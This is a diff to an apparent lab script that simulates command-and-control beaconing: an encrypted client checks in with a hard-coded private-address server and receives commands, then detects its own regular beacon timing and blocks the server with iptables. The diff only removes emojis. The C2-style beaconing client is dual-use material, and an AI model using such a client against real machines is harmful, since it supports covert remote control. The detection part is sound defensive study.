@@ -5,7 +5,7 @@ import os
 from cryptography.fernet import Fernet
 
 # ========================
-# 🔐 CONFIG
+# CONFIG
 # ========================
 key = b'N13E54NxFeO9-_Lmv7fKvKLcQdiy6o5EqTpMyTQMb_U='
 cipher = Fernet(key)
@@ -14,7 +14,7 @@ HOST = "192.168.100.1"
 PORT = 4444
 
 # ========================
-# 🔌 CONNECT
+# CONNECT
 # ========================
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((HOST, PORT))
@@ -23,7 +23,7 @@ client.settimeout(1)
 print("[+] Connected to server")
 
 # ========================
-# 📊 DETECTION VARIABLES
+# DETECTION VARIABLES
 # ========================
 last_time = None
 intervals = []
@@ -32,10 +32,10 @@ alert_triggered = False
 blocked = False
 
 # ========================
-# 🚫 BLOCK FUNCTION
+# BLOCK FUNCTION
 # ========================
 def block_ip(ip):
-    print(f"\n🚫 Blocking C2 Server: {ip}\n")
+    print(f"\n Blocking C2 Server: {ip}\n")
 
     # Block outgoing traffic
     os.system(f"sudo iptables -A OUTPUT -d {ip} -j DROP")
@@ -44,20 +44,20 @@ def block_ip(ip):
     os.system(f"sudo iptables -A INPUT -s {ip} -j DROP")
 
 # ========================
-# 🔁 MAIN LOOP
+# MAIN LOOP
 # ========================
 while True:
     try:
         current_time = time.time()
 
         # ========================
-        # 📡 BEACON
+        #  BEACON
         # ========================
         beacon = "HELLO_FROM_CLIENT"
         client.send(cipher.encrypt(beacon.encode()))
 
         # ========================
-        # 📊 DETECTION LOGIC
+        #  DETECTION LOGIC
         # ========================
         if last_time is not None:
             interval = current_time - last_time
@@ -73,10 +73,10 @@ while True:
 
                 if all(abs(i - avg) < 0.7 for i in intervals):
                     if not alert_triggered:
-                        print("\n⚠️ [ALERT] C2 Beaconing Detected!\n")
+                        print("\n [ALERT] C2 Beaconing Detected!\n")
                         alert_triggered = True
 
-                        # 🚫 BLOCK + TERMINATE
+                        #  BLOCK + TERMINATE
                         if not blocked:
                             block_ip(HOST)
                             blocked = True
@@ -90,7 +90,7 @@ while True:
         last_time = current_time
 
         # ========================
-        # 📡 RECEIVE COMMAND
+        # RECEIVE COMMAND
         # ========================
         try:
             data = client.recv(4096)
@@ -109,7 +109,7 @@ while True:
             pass
 
         # ========================
-        # ⏱️ FIXED INTERVAL
+        #  FIXED INTERVAL
         # ========================
         time.sleep(5)
 
